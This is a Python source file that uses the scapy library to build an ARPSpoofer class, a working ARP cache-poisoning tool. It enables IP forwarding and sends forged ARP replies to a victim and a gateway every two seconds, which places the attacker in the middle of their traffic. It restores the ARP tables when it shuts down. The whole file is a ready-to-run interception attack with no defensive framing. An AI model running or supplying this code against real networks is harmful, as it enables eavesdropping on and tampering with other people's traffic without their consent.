from scapy.all import *
import atexit
from threading import Thread
import time


class ARPSpoofer:
    def __init__(self, victim_ip, gateway_ip):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip

        self.enable_ip_forward()

        self.original_victim_mac = AskARP(victim_ip)
        self.original_gateway_mac = AskARP(gateway_ip)

        atexit.register(self.on_shutdown, self)
        thread = Thread(target=self.poison_thread, args=(self,))
        thread.start()
        print("[+] ARP poison thread started.")

    def enable_ip_forward(self):
        print("[+] Enabling IP Forwarding.")
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward_file:
            forward_file.write('1\n')

    def disable_ip_forward(self):
        print("[+] Disabling IP Forwarding.")
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward_file:
            forward_file.write('0\n')

    def poison_arp_table(self):
        send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst=self.original_victim_mac), verbose=False)
        send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=self.original_gateway_mac), verbose=False)

    def restore_arp_table(self):
        print("[+] Restoring ARP table.")
        send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                 hwsrc=self.original_gateway_mac), count=3, verbose=False)
        send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst="ff:ff:ff:ff:ff:ff",
                 hwsrc=self.original_victim_mac), count=3, verbose=False)

    def on_shutdown(self, arg):
        self.restore_arp_table()
        self.disable_ip_forward()

    def poison_thread(self, arg):
        while 1:
            self.poison_arp_table()
            time.sleep(2)


def AskARP(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src
